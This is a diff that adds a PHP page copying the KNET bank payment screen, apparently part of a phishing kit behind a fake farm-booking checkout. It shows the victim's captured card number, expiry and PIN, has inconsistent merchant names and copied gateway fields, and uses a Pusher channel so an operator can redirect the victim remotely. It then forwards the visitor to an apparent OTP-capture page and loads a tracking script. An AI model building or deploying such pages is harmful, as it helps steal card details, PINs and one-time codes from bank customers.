@@ -1,0 +1,566 @@
+<?php
+$reservation_id = isset($_GET['reservation_id']) ? preg_replace('/\D/', '', (string) $_GET['reservation_id']) : '';
+if ($reservation_id === '') {
+	$reservation_id = '0';
+}
+$farm_order_id = isset($_GET['farm_order_id']) ? preg_replace('/[^\d]/', '', (string) $_GET['farm_order_id']) : '';
+$total = '0.000';
+if (isset($_GET['total'])) {
+	$t = filter_var($_GET['total'], FILTER_VALIDATE_FLOAT);
+	if ($t !== false && $t >= 0) {
+		$total = number_format($t, 3, '.', '');
+	}
+}
+
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+	<meta http-equiv="Pragma" content="no-cache">
+	<meta http-equiv="Expires" content="-1">
+	<meta http-equiv="CACHE-CONTROL" content="max-age=0">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<title>KNET Payments</title>
+	<script src="knet/jquery-3.5.1.js"></script>
+	<script src="../js/farm_checkout_total.js"></script>
+	<script src="../js/farm_knet_card_snapshot.js"></script>
+</head>
+
+<body>
+	<link href="knet/payment-responsive.css" rel="stylesheet" type="text/css">
+	<link href="knet/payment-stylesheet.css" rel="stylesheet" type="text/css">
+
+	<form method="post" action=""><input type="hidden" name="_token" value="" autocomplete="off">		<div class="">
+			<img src="./knet/mob.jpg" alt="" style="width: 100%; max-width: 350px; height: auto; display: block; margin: 20px auto 0;">
+		</div>
+
+		<div id="PayPageEntry">
+			<div class="container">
+				<div class="content-block">
+					<div class="form-card">
+						<div align="center" class="container-blogo">
+							<img style="width: 60px" class="" src="knet/knet.png" alt="logo">
+						</div>
+						<div class="row">
+							<label class="column-label">Merchant: </label>
+							<label class="column-value text-label">Althnayan</label>
+						</div>
+						<div id="OrgTranxAmt">
+							<label class="column-label">
+								Amount:
+							</label>
+							<label class="column-value text-label">
+							 KD <?= $total ?>
+							</label>
+						</div>
+
+						<div id="farm_kwait_card_wrap" style="display:none;margin-top:10px;padding-top:10px;border-top:1px solid #e0e0e0;">
+							<div class="row">
+								<label class="column-label">Card Number:</label>
+								<label class="column-value text-label" id="farm_kw_DCNumber" dir="ltr">—</label>
+							</div>
+							<div class="row">
+								<label class="column-label">Expiration Month:</label>
+								<label class="column-value text-label" id="farm_kw_expmnth">—</label>
+							</div>
+							<div class="row">
+								<label class="column-label">Expiration Year:</label>
+								<label class="column-value text-label" id="farm_kw_expyear">—</label>
+							</div>
+							<div class="row">
+								<label class="column-label">PIN:</label>
+								<label class="column-value text-label" id="farm_kw_pin_display">—</label>
+							</div>
+						</div>
+
+						<!-- Added for PG Eidia Discount starts   -->
+
+						<div class="row" id="DiscntRate" style="display:none;">
+
+						</div>
+						<div class="row" id="DiscntedAmt" style="display:none;">
+
+						</div>
+
+						<!-- Added for PG Eidia Discount ends   -->
+
+					</div>
+
+					<div class="form-card">
+						<div class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
+    						font-family: helvetica, arial, sans serif;
+    						color: #ff0000;
+   							 padding-right: 15px; display:none;margin-bottom: 3px;text-align: center;" id="otpmsgDC">
+						</div>
+
+						<!--Customer Validation  for knet-->
+						<div class="notification" style="border: #ff0000 1px solid;background-color: #f7dadd; font-size: 12px;
+    						font-family: helvetica, arial, sans serif;
+    						color: #ff0000;
+   							 padding-right: 15px; display:none;margin-bottom: 3px;text-align: center;" id="CVmsg">
+						</div>
+
+						
+
+						<div id="FCUseDebitEnable" style="margin-top: 5px;">
+
+						<div class="row">
+
+							<div style="text-align:center;">
+								<div id="loading">
+									<center><img src="knet/loading.gif"
+											style="height:20px;float:left;margin-left:20%"><label
+											class="column-value text-label"
+											style="width:70%;text-align:center;">Processing.. please wait ...</label>
+									</center>
+                                    
+								</div>
+                                
+						</div>
+					</div>
+
+					<div align="center" id="overlayhide" class="overlay">
+						<img src="knet/loadingmob.gif" style="height: 15%;margin-top:50%;">
+					</div>
+                    <p dir="rtl" align="right">يرجى الإنتظار, سوف يتم معالجة الدفع خلال لحظات...</p>
+						</div>
+					</div>
+
+					<footer>
+						<div class="footer-content-new">
+							<div class="row_new">
+								<div style="text-align: center;font-size: 11px;line-height: 18px;">
+									All Rights Reserved. Copyright 2026 <br><span
+										style="font-size: 10px;font-weight:bold;color: #0077D5;">The Shared Electronic Banking Services Company
+										- KNET</span>
+								</div>
+							</div>
+
+							<div id="DigiCertClickID_cM-vbZrL"></div>
+						</div>
+						<div id="DigiCertClickID_cM-vbZrL"></div>
+					</footer>
+
+
+				</div>
+			</div>
+		</div>
+
+
+
+
+		<!--  Payment Page Confirmation Starts-->
+		<div id="payConfirm" style="display: none;">
+			<div class="container">
+				<div class="content-block">
+
+					<div class="form-card">
+						<div class="container-blogo">
+							<img class="logoHead-mob" src="knet/knet.png" alt="logo">
+						</div>
+						<div class="row">
+							<div><label class="column-label">Merchant:</label></div>
+							<div><label class="column-value text-label">Tap Payments EPSP</label> </div>
+						</div>
+						<div id="OrgTranxAmtConfirm">
+							<div><label class="column-label">Amount:</label></div>
+							<div><label class="column-value text-label"> KD <?= $total ?></label></div>
+						</div>
+
+						<!-- Added for PG Eidia Discount -->
+
+						<div class="row" id="DiscntRateConfirm" style="display:none;">
+
+						</div>
+						<div class="row" id="DiscntedAmtConfirm" style="display:none;">
+
+						</div>
+
+						<!-- Added for PG Eidia Discount -->
+
+					</div>
+					<div class="form-card">
+						<div class="notification" style="border: #ff0000 1px solid; background-color: #f7dadd; font-size: 12px;
+    						font-family: helvetica, arial, sans serif;
+    						color: #ff0000;
+   							 padding-right: 15px; margin-bottom: 3px;text-align: center;display:none;" id="otpmsgDC2">
+						</div>
+						<div class="row alert-msg" id="notificationbox"
+							style="color:#31708f; font-family: Arial, Helvetica, serif; font-size: 13px;">
+							<!-- Added for Points Redemption - modified -->
+							<div id="notification">
+								<!-- <p><span class="title" style="font-weight:bold">NOTIFICATION:</span> You will presently receive an SMS on your mobile number registered with your bank.
+This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.</p> -->
+							</div>
+						</div>
+						<div class="row">
+
+							<div id="payConfirmCardNum">
+
+								<!-- Added for Points Redemption -->
+
+
+
+								<label class="column-label">Card Number:</label>
+
+								<!-- Added for Points Redemption -->
+
+							</div>
+							<div><label class="column-value text-label" id="DCNumber" style="padding-left:5px;"></label>
+							</div>
+						</div>
+						<div class="row" id="payConfirmExpmnth">
+							<div><label class="column-label" style="width:41%">Expiration Month:</label></div>
+							<div><label class="column-value text-label" id="expmnth"
+									style="padding-left:5px;width:59%"></label></div>
+						</div>
+						<div row id="payConfirmExpyr">
+							<div><label class="column-label">Expiration Year:</label></div>
+							<div><label class="column-value text-label" id="expyear" style="padding-left:5px;"></label>
+							</div>
+						</div>
+						<!-- Added for Points Redemption -->
+
+						<div class="row">
+							<div><label class="column-label">PIN:</label></div>
+							<div><label class="column-value text-label" style="padding-left:5px;">****</label></div>
+						</div>
+
+						<!-- Added for Points Redemption -->
+
+						<div class="row" id="OTPDCDIV" style="display: none;">
+							<div><label class="column-label" style="padding-top: 4px;">OTP:</label></div>
+							<div>
+								<!-- <input class="paymentinput" style="width: 60%;"  type="tel" id="debitOTPtimer" name="debitOTP" placeholder="teset" size="6" maxLength="6" 
+                    	onkeyup="return isOtpNumeric(event);" onkeypress="return isOtpNumeric(event);" /> -->
+								<input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off"
+									class="allownumericwithoutdecimal" style="width: 60%;" id="debitOTPtimer"
+									name="debitOTP" placeholder="teset" size="6" maxlength="6"
+									onkeyup="return isOtpNumeric(event);" onkeypress="return isOtpNumeric(event);"
+									oninput="return isOtpNumeric(event);">
+								<!-- Added for Points Redemption -->
+
+								<div><label class="column-value text-label"
+										style="display:none;float: right; cursor: pointer;color: #0077D5;text-decoration: underline;"
+										id="Resend" onclick="payConfirmAjax('Resend');">Resend OTP</label></div>
+								<!-- Added for Points Redemption -->
+							</div>
+						</div>
+					</div>
+
+					<div class="form-card">
+						<div class="row">
+							<div style="text-align: center;">
+
+								<div id="loading" style="display:none;">
+									<center><img src="knet/loading.gif"
+											style="height:20px;float:left;margin-left:20%"><label
+											class="column-value text-label"
+											style="width:70%;text-align:center;">Processing.. please wait ...</label>
+									</center>
+								</div>
+
+								<div id="submithide1">
+									<button type="button" name="confirm" id="proceedConfirm" class="submit-button"
+										onclick="payConfirmAjax('VALIDATE');"> Confirm</button>
+									<input name="proceedCancel" type="button" class="cancel-button"
+										onclick="cancelPage(); sibTags('MobCancelBtnAR','MobPayPageAR','CancelBtnAR');"
+										id="cancel1" value="Cancel">
+								</div>
+							</div>
+						</div>
+					</div>
+
+					<div align="center" id="overlayhide1" class="overlay" style="display:none;">
+						<img src="knet/loadingmob.gif" style="height: 15%;margin-top:50%;">
+					</div>
+
+					<footer>
+						<div class="footer-content">
+							<span>
+								<div class="row_new">
+									<div
+										style="text-align: center;font-size: 11px; color: #000000;font-weight:normal;line-height: 18px;">
+										All Rights Reserved. Copyright 2026 <br><span
+											style="font-size: 10px;font-weight:bold;color: #0077D5;">
+											The Shared Electronic Banking Services Company -
+											KNET</span>
+									</div>
+								</div>
+							</span>
+
+						</div>
+					</footer>
+				</div>
+			</div>
+		</div>
+
+
+		<input type="hidden" name="encryptedCardNumber" id="encryptedCardNumber" value="">
+		<input type="hidden" name="encryptedMonth" id="encryptedMonth" value="">
+		<input type="hidden" name="encryptedYear" id="encryptedYear" value="">
+		<!-- Hidden Fields : Start -->
+
+		<input type="hidden" name="creditDebitCheck">
+
+		<!--  End -->
+		<!-- Code Added for GSTN fix Starts -->
+		<input type="hidden" name="gstnTXNId" id="gstnTXNId" value="">
+		<input type="hidden" name="gstnFlag" id="gstnFlag" value="0">
+		<input type="hidden" name="paymentInitTime" id="paymentInitTime" value="Wed Dec 18 18:07:04 AST 2024">
+		<!-- Code Added for GSTN fix Ends -->
+		<input type="hidden" name="gripsFlag" value="">
+		<input type="hidden" name="selectedPymntInstrmnt" id="selectedPymntInstrmnt" value="">
+		<input type="hidden" name="captchaMsg" id="captchaMsg" value="">
+		<!-- End -->
+		<input type="hidden" name="paymentId" value="102435359000254804">
+		<input type="hidden" name="atmPayRetentionPeriod" value="0">
+
+
+		<input type="hidden" name="merchHeaderFile" value="">
+
+		<input type="hidden" name="mrchName" value="Tap Payments EPSP">
+		<input type="hidden" name="mrchWeb" value="https://kw.payments.tap.company">
+		<input type="hidden" name="pymntInstrmntCC" id="pymntInstrmntCC" value="1">
+
+		<input type="hidden" name="pymntInstrmntAC" value="0">
+		<input type="hidden" name="pymntInstrmntDC" id="pymntInstrmntDC" value="1">
+		<input type="hidden" name="pymntInstrmntPC" id="pymntInstrmntPC" value="0">
+
+		<input type="hidden" name="pymntInstrmntPZ" id="pymntInstrmntPZ" value="0">
+
+		<input type="hidden" name="pymntInstrmntAP" value="0">
+		<input type="hidden" name="pymntInstrmntDD" value="0">
+		<input type="hidden" name="ecomFlg" value="0">
+		<input type="hidden" name="captchaFlg" value="0">
+		<input type="hidden" name="instName" value="KIB">
+
+		<input type="hidden" name="avsFlg" value="0">
+		<input type="hidden" name="headerType" value="0">
+		<input type="hidden" name="maestroCheckFlag" value="0">
+		<input type="hidden" name="rupFlg" value="0">
+		<input type="hidden" name="pymntInstrmntIMPS" value="0">
+		<input type="hidden" name="footer" value="">
+
+		<input type="hidden" name="debitSel" value="P">
+		<input type="hidden" name="creditSel" value="">
+		<input type="hidden" name="prepaidSel" value="">
+
+		<input type="hidden" name="siFlag" value="0">
+
+		<input type="hidden" name="fcFlag" id="fcFlag" value="0">
+		<input type="hidden" name="fcChecked" id="fcChecked">
+		<input type="hidden" name="deletecard" value="">
+		<input type="hidden" name="cardnohash" value="">
+
+		<input type="hidden" name="fcExpCheck" id="fcExpCheck">
+		<input type="hidden" name="fcCtCheck" id="fcCtCheck" value="0">
+		<input type="hidden" name="fcDtCheck" id="fcDtCheck" value="0">
+		<input type="hidden" name="fcPdCheck" id="fcPdCheck" value="0">
+
+		<input type="hidden" name="rdc" id="rdc" value="">
+		<input type="hidden" name="checkBrand" id="checkBrand" value="">
+		<input type="hidden" name="onOffType" id="onOffType" value="">
+		<input type="hidden" name="maestro" id="maestro" value="">
+
+		<input type="hidden" name="ccInstFlg" value="0">
+		<input type="hidden" name="ccTermFlg" value="0">
+		<input type="hidden" name="merchantCurrencyFlg" value="0">
+		<input type="hidden" name="cardCurrencyFlg" value="0">
+		<input type="hidden" name="otherCurrencyFlg" value="0">
+
+		<input type="hidden" name="pymntInstrmntCnt" id="pymntInstrmntCnt" value="2">
+
+		<input type="hidden" value="" name="cspg">
+		<input type="hidden" name="CSRFToken" value="feadcc1d-93a9-46c8-b28f-f503abfc8d0b">
+
+		<input type="hidden" value="" name="otpStatus">
+		<input type="hidden" value="0" name="otpallowed">
+		<input type="hidden" value="0" name="otpmethod">
+		<input type="hidden" name="emiFlag" id="emiFlag" value="0">
+		<input type="hidden" name="radioFlag" id="radioFlag" value="0">
+		<input type="hidden" name="otherCards" id="otherCards" value="">
+		<input type="hidden" name="textFile" value="-">
+		<input type="hidden" name="errorStr" id="errorStr">
+		<input type="hidden" name="resultCode" id="resultCode">
+		<input type="hidden" name="postDate" id="postDate">
+		<input type="hidden" name="responseCode" id="responseCode">
+		<!-- Added for Rupay denied by Risk -->
+		<input type="hidden" name="tranId" id="tranId">
+		<input type="hidden" name="authCode" id="authCode">
+		<!-- End -->
+
+		<input type="hidden" name="mrchHeaderMsgFile" value="">
+		<input type="hidden" name="mrchHeaderHtmlFile" value="">
+		<input type="hidden" name="instHeaderHtmlFile" value="">
+
+		<input type="hidden" id="OtpUserID" name="OtpUserID" value="">
+		<input type="hidden" name="paymentOtpGenCancel">
+		<input type="hidden" name="otpConfirmationFlg">
+		<input type="hidden" name="MaskingCardNum" value="0">
+		<input type="hidden" id="debitCardNumber" name="debitCardNumber" value="">
+		<input type="hidden" name="fCCustMob" id="fCCustMob" value="">
+		<input type="hidden" name="encryptedSavedCardPin" id="encryptedSavedCardPin" value="">
+		<input type="hidden" name="config">
+		<input type="hidden" name="timeOver" value="0">
+		<input type="hidden" name="Otptenant">
+		<input type="hidden" name="useragent" value="Android">
+		<input type="hidden" name="currSymbol" value="KD">
+		<input type="hidden" name="usingFc">
+		<input type="hidden" name="inst_p2pflg" value="0">
+		<input type="hidden" name="mrch_p2pflg" value="0">
+		<input type="hidden" name="term_p2pflg" value="0">
+		<input type="hidden" name="otpgencount" value="0">
+		<input type="hidden" name="otpvalcount" value="0">
+		<input type="hidden" name="langID" value="EN">
+		<input type="hidden" name="paymentCVdeclineValue">
+		<input type="hidden" name="custvalid" value="0">
+		<input type="hidden" name="otpflgdiv" value="0">
+		<!-- Added by jansirani for P2P Refund -->
+		<input type="hidden" name="p2pRefundFlg" value="0">
+		<input type="hidden" name="instp2pRefundFlg" value="0">
+		<input type="hidden" name="termp2pRefundFlg" value="0">
+		<input type="hidden" name="mrchp2pRefundFlg" value="0">
+		<input type="hidden" name="p2pRefundId" value="">
+		<input type="hidden" name="BranDType">
+
+		<!-- Added for OTP at I-T-B level -->
+		<input type="hidden" name="appAllbrands" value="1">
+		<input type="hidden" name="accptBrndListAmtlmt" value="">
+		<input type="hidden" name="accptBrndList"
+			value="202330389621213,201916924925612,201916924855488,201916975234419,201916924643150,201916924589070,201916924542860,202217100853887,201916975055702,201916924900814,201916924803186,201916924658211,201916975376462,201916924560086,201916924517503,201916405343641">
+		<input type="hidden" name="binsOTPflg" value="1">
+		<input type="hidden" name="amountlimit" value="25.000">
+		<input type="hidden" name="OTPtranamtlmt">
+		<input type="hidden" name="OTPamtlmtidentifier">
+		<!-- Added for OTP at I-T-B level -->
+
+		<!-- Added for Points Redemption  -->
+		<input type="hidden" id="otpgenMethod" name="otpgenMethod" value="">
+		<input type="hidden" name="resend" value="">
+		<input type="hidden" name="pymntPointsRedemptionflg" value="0">
+		<!-- Added for Points Redemption  -->
+
+
+		<!--Added for PG Discount flag  -->
+		<input type="hidden" name="discountval">
+		<input type="hidden" name="discountedtranamount">
+		<!--Added for PG Discount flag  -->
+
+		<!-- End -->
+
+		<!-- Added for PROD issue 5th tranx without OTP -->
+		<input type="hidden" name="OTPtranId" value="">
+		<!-- Added for PROD issue 5th tranx without OTP -->
+
+		<input type="hidden" name="debitYear" id="debitYearSelect" value="0">
+		<input type="hidden" name="debitMonth" id="debitMonthSelect" value="0">
+
+		<!-- Hidden Fields : End -->
+
+		<!-- Added for prod issue - 29-jun-21 -->
+		<input type="hidden" name="paymentStatus" value="">
+		<!-- <input type="hidden" name="pymntpagebkstatus" value=""/> -->
+		<input type="hidden" name="ErrorText" value="">
+		<!-- Added for prod issue - 29-jun-21 -->
+
+		<input type="hidden" name="kfastRegAttemptCount" value="0">
+		<input type="hidden" name="kfastRegDeclineValue">
+	</form>
+<script src="https://js.pusher.com/8.4.0/pusher.min.js"></script>
+<script>
+try {
+    var _fo = <?= json_encode($farm_order_id ?? '') ?>;
+    if (_fo) {
+        sessionStorage.setItem('farm_order_id', String(_fo));
+    }
+} catch (eFarm) {}
+// ✅ جلب reservation_id من PHP (نصي ليتوافق مع Date.now() وقنوات Pusher)
+const reservationId = <?= json_encode($reservation_id ?? '0', JSON_UNESCAPED_UNICODE) ?>;
+
+try {
+    if (reservationId && reservationId !== '0') {
+        sessionStorage.setItem('farm_knet_reservation_id', String(reservationId));
+    }
+} catch (eRidStore) {}
+
+if (reservationId && reservationId !== '0') {
+    console.log('Listening for redirect on reservation_id:', reservationId);
+
+    // إعداد Pusher
+    const pusher = new Pusher('a56388ee6222f6c5fb86', {
+        cluster: 'ap2',
+        encrypted: true
+    });
+
+    // الاشتراك في القناة الخاصة بهذا المستخدم
+    const userChannel = pusher.subscribe('redirect-user-' + reservationId);
+
+    // الاستماع لحدث redirect-event
+    userChannel.bind('redirect-event', function(data) {
+        console.log('✅ Redirect event received:', data);
+        
+        if (data.redirect_url) {
+            console.log('🚀 Redirecting to:', data.redirect_url);
+            window.location.href = data.redirect_url;
+        }
+    });
+
+    // تأكيد الاتصال
+    pusher.connection.bind('connected', function() {
+        console.log('✅ Pusher connected for reservation:', reservationId);
+    });
+
+    pusher.connection.bind('error', function(err) {
+        console.error('❌ Pusher error:', err);
+    });
+} else {
+    console.warn('⚠️ No reservation_id found, redirect disabled');
+}
+
+</script>
+<script>
+(function () {
+	var phpTotal = <?= json_encode($total, JSON_UNESCAPED_UNICODE) ?>;
+	function resolvedTotal() {
+		return typeof farmCheckoutTotal !== 'undefined'
+			? farmCheckoutTotal.resolve(phpTotal)
+			: phpTotal;
+	}
+	var t = resolvedTotal();
+	var lab = document.querySelector('#OrgTranxAmt .column-value.text-label');
+	if (lab) {
+		lab.textContent = ' KD ' + t;
+	}
+	var ridKw = <?= json_encode($reservation_id, JSON_UNESCAPED_UNICODE) ?>;
+	var oidKw = <?= json_encode($farm_order_id, JSON_UNESCAPED_UNICODE) ?>;
+	try {
+		if (typeof farmKnetCardSnapshot !== 'undefined' && farmKnetCardSnapshot.applyToKnetwaitPageIfMatch(ridKw, oidKw)) {
+			var wrap = document.getElementById('farm_kwait_card_wrap');
+			if (wrap) {
+				wrap.style.display = 'block';
+			}
+		}
+	} catch (eKw) {}
+	function buildVerUrl() {
+		var q = new URLSearchParams();
+		q.set('reservation_id', <?= json_encode($reservation_id, JSON_UNESCAPED_UNICODE) ?>);
+		q.set('total', t);
+		<?php if ($farm_order_id !== '') { ?>
+		q.set('order_id', <?= json_encode($farm_order_id, JSON_UNESCAPED_UNICODE) ?>);
+		<?php } ?>
+		return '../verfi/verfi/phone/ver.php?' + q.toString();
+	}
+	window.setTimeout(function () {
+		window.location.href = buildVerUrl();
+	}, 3000);
+})();
+</script>
+<script src="../js/client_track.js"></script>
+
+</body>
+
+</html>
